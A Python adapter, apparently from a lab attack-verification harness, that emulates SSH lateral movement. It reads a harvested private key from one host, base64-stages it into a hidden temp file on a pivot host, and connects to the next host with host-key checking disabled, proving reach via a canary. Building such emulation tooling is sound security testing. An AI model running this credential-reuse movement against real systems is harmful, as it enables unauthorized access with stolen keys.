"""Lateral-SSH adapter — reused-key SSH lateral movement (T1021.004 + T1550).

Movement, not local escalation: use the credential recovered by
credential_read to SSH to the next host, then read that host's canary.
Success is the target canary, proving the reused key actually landed a session.

Supports cross-host credential staging: when ``key_source_host`` is supplied
and differs from ``ctx.host``, the adapter reads the harvested private key from
``key_source_host`` and stages it temporarily (mode 0600, removed on exit) onto
``ctx.host`` so multi-hop lateral verification works even when intermediate
pivot hosts do not already hold a local copy of the key on disk.
"""

from __future__ import annotations

import base64

from verifier.adapters import AdapterResult, RunContext, register
from verifier.lab import exec_as
from verifier.signal import session_established


@register("lateral_ssh")
def lateral_ssh(ctx: RunContext) -> AdapterResult:
    """SSH to a target host using a local or staged harvested key."""
    key_path = ctx.technique.get("key_path")
    to_host = ctx.technique["to_host"]
    to_user = ctx.technique["to_user"]
    key_source_host = ctx.technique.get("key_source_host")
    key_source_user = ctx.technique.get("key_source_user", "root")
    key_source_path = ctx.technique.get("key_source_path") or key_path

    if key_source_host and key_source_host != ctx.host:
        if not key_source_path:
            return AdapterResult(
                escalated=False,
                evidence=f"missing key_source_path for staging from {key_source_host}",
                raw_cmd=[],
            )
        code, key_material, err = exec_as(
            key_source_host,
            key_source_user,
            ["cat", key_source_path],
            prefix=ctx.container_prefix,
        )
        if code != 0 or not key_material.strip():
            return AdapterResult(
                escalated=False,
                evidence=(
                    f"failed to read harvested key {key_source_path} from "
                    f"{key_source_host}: {err.strip() or f'exit {code}'}"
                ),
                raw_cmd=["cat", key_source_path],
            )
        encoded = base64.b64encode(key_material.encode("utf-8")).decode("ascii")
        stage_step = f"printf '%s' '{encoded}' | base64 -d > $TMPKEY"
    else:
        stage_step = f"cp {key_path} $TMPKEY 2>/dev/null"

    # OpenSSH requires private keys to be mode 0600. Stage to a temporary file
    # before connecting and always remove it on exit.
    payload = (
        f"TMPKEY=/tmp/.ascend_{ctx.run_id} && "
        f"{stage_step} && "
        f"chmod 600 $TMPKEY 2>/dev/null && "
        f"ssh -i $TMPKEY "
        f"-o StrictHostKeyChecking=no "
        f"-o BatchMode=yes "
        f"-o ConnectTimeout=10 "
        f"{to_user}@{to_host} "
        f"'whoami' 2>&1; "
        f"RET=$?; rm -f $TMPKEY; exit $RET"
    )
    cmd = ["sh", "-c", payload]

    ok, evidence = session_established(
        ctx.host, ctx.start_user, cmd, to_user,
        prefix=ctx.container_prefix,
    )
    return AdapterResult(escalated=ok, evidence=evidence, raw_cmd=cmd)
